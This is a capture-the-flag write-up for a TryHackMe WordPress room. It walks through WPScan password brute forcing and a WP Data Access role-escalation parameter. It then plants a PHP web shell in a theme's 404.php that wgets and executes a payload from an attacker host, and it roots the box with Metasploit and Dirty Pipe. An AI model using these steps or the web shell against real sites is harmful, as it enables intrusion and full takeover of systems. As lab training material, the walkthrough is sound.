room_url: https://tryhackme.com/r/room/breakmenu

------------------**Recon**---------------------

**Nmap** scan found only two open ports **22** and **80**

![nmap-1](https://github.com/user-attachments/assets/b8e393c4-68aa-43dd-b6d1-1d1b9e8f1d10)

**directory brute forcing**

start with common.txt word-list and find simple WordPress blog endpoint among other things (other word lists have no more interesting endpoints).

![fuzzing](https://github.com/user-attachments/assets/6e44dbf5-9f92-46e8-9607-2bb94e46197c)

the blog have no interesting url's

![index](https://github.com/user-attachments/assets/09514868-af27-446c-a1c2-6dc991c2d0cb)

---------**Foothold**--------------------------------
since this is WordPress application, best thing to do is run WPScan to enumeration the application (register for free to get api token at https://wpscan.com/api/)

`wpscan --url http://IP/wordpress/ --plugins-detection mixed --plugins-version-detection mixed -e u,vp --api-token rzsE3U.............`


![wpscan-1](https://github.com/user-attachments/assets/d13010af-15c1-4d3b-a7f5-93d8f651d317)


**4 vulnerabilities identified in wordpress** core unfortunately no **Poc's** 

![wpscan-2](https://github.com/user-attachments/assets/a4772a94-2860-4151-b4e0-64cb5b9a487f)


**4 vulnerabilities identified in plugin 'wp-data-access'** what cough my eye are  "Unauthenticated SQL Injection" and "Cross-Site Request Forgery makes it possible for unauthenticated attackers to trigger backups" i didn't find Poc's nor did i manage to locate route for the parameters that are vulnerable to sqli. 

![wpscan-3](https://github.com/user-attachments/assets/29b1d95f-9b33-4bb3-b25c-32cdfb6ffa73)

it tooke hour until i decided to brute force login panel, as we alredy know 2 users from wpscan


![wpscan-4](https://github.com/user-attachments/assets/286c162d-8c99-42e8-8a60-466dc39d8e5d)


`wpscan --url http://10.10.203.217/wordpress/ --plugins-detection mixed --plugins-version-detection mixed -e u --passwords /usr/share/wordlists/rockyou.txt`

![wpscan-5](https://github.com/user-attachments/assets/214c436b-472e-4c71-bfb3-249e9d97d104)

We found **bob** password and as this is my second time solving the box i killed admin password brute force since i was unable to get it first time

![wpscan-6](https://github.com/user-attachments/assets/6bc71ae2-46e9-46a6-b16b-b582c7a0fdc8)

**bob dashboard** 

![bob](https://github.com/user-attachments/assets/ce42b517-e1c6-4a18-91e3-63d23f37b51a)

**Privilege Escalation:**

since bob is low level user and our enumeration provided priv-esc vulnerability, our next step is exploiting **Privilege Escalation Vulnerability in WP Data Access WordPress Plugin**":

**Poc** at : https://www.wordfence.com/blog/2023/04/privilege-escalation-vulnerability-patched-promptly-in-wp-data-access-wordpress-plugin/


`The WP Data Access plugin for WordPress is vulnerable to privilege escalation in versions up to, and including, 5.3.7. This is due to a lack of authorization checks on the multiple_roles_update function. This makes it possible for authenticated attackers, with minimal permissions such as a subscriber, to modify their user role by supplying the ‘wpda_role[]‘ parameter during a profile update. This requires the ‘Enable role management’ setting to be enabled for the site.`

so by adding "`wpda_role[]administrator`" to our update profile request 

steps:

add info to some field:
![priv-esc-1](https://github.com/user-attachments/assets/d8bae0da-2c3e-4a89-8b71-c456c5bb29d9)

 interception request and add `wpda_role[]administrator` parameter to request body:
![priv-esc-2](https://github.com/user-attachments/assets/b4aec1f4-413b-43f3-b1d9-dd005f85ac2f)

we get redirected and our privilege elevated 🥇 

![priv-esc-3](https://github.com/user-attachments/assets/6b63a99f-3688-43af-92d6-b0637452178f)



-------------**Reverse Shell and root system privileges**-------------------
this is the part where 'made easy' in the title come from.

in order to get rev-shell in WordPress  we replace the content of them with a reverse shell, to make our priv-esc easier we use Metasploit:

Run `msfconsole`

`msf6 > use exploit/multi/script/web_delivery` and fill the options

we get our command and edited it as follow:

```
<?php
$command = 'wget -qO otdUOuYR --no-check-certificate http://ip:port/payloadNma; chmod +x otdUOuYR; ./otdUOuYR& disown';
shell_exec($command);
?>
```

**404 them for 2021 year found in**: http://ip/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwentyone


 
![wpscan-7](https://github.com/user-attachments/assets/651f8c9f-dfc8-4653-8f98-938ff67a70a3)



![priv-esc-4](https://github.com/user-attachments/assets/b76ad0d4-8449-4f22-900d-83b2868355cc)




run shell by accessing our edited theme in: http://ip/wordpress/wp-content/themes/twentytwentyone/404.php

![wpscan-8](https://github.com/user-attachments/assets/0e0b8dfa-2a1f-48d4-8a36-a4e0e7494b85)




-----------------------------**root system privileges**

Metasploit Framework have lovely Post exploitation module that  suggests local meterpreter exploits that can be used to elevate privileges:

` use post/multi/recon/local_exploit_suggester`


 

![suggester-1](https://github.com/user-attachments/assets/91554174-ae6f-4050-9283-9b069fbe751b)


using **dirty-pip kernel exploit** we manage to elevate our privileges to root

**now we search for the flags**


![suggester-4](https://github.com/user-attachments/assets/0e4d16ec-5d8e-4704-9f1c-d2b8bbec2c57)


![suggester-5](https://github.com/user-attachments/assets/d48f84a9-22db-489f-bc1a-46b5c4422a89)




